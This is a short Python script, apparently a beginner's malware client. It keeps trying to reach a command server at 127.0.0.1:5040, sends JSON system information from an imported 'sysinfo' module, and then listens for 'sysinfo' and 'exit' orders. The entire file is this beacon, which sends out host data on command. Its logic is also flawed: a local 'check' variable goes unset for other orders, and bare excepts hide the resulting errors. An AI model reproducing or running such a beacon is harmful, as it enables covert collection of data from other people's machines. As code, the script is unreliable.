
import socket
import time
import json
from sysinfo import all_info

check = False
def send_data(malware_socket):
    
    malware_socket.send(json.dumps(all_info()).encode()) 
    #print("if you only see me this is second time.")
    # if request for sending has been accepted send all info

def recv_data(malware_socket):
    order = malware_socket.recv(1024)
    order = order.decode()
    print(order)
    # wait for order to be received
    if order == 'exit':
        #print("we closing")
        check =True
    if order == 'sysinfo': 
        # needs fixing.
        send_data(malware_socket)
        check =False
    return check
   

# Create a socket object
malware_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Set the server IP and port
server_ip = '127.0.0.1'
server_port = 5040

# Continuously try to establish a connection with the server
while True:
    try:
        #print("we are running ?")
        malware_socket.connect((server_ip, server_port))
        print("Connected to the server!")
        send_data(malware_socket)
        #print("we did send data")
        while True:
            try: # be ready after connection to recieve data
                a = recv_data(malware_socket)
                print(a)
                if a == True:
                    print("we here")
                    break
                else:
                    time.sleep(0.5)
            except:
                    time.sleep(0.5)
        #print("we outta here")
    except:
        print("unable to reach the server")
        time.sleep(1)





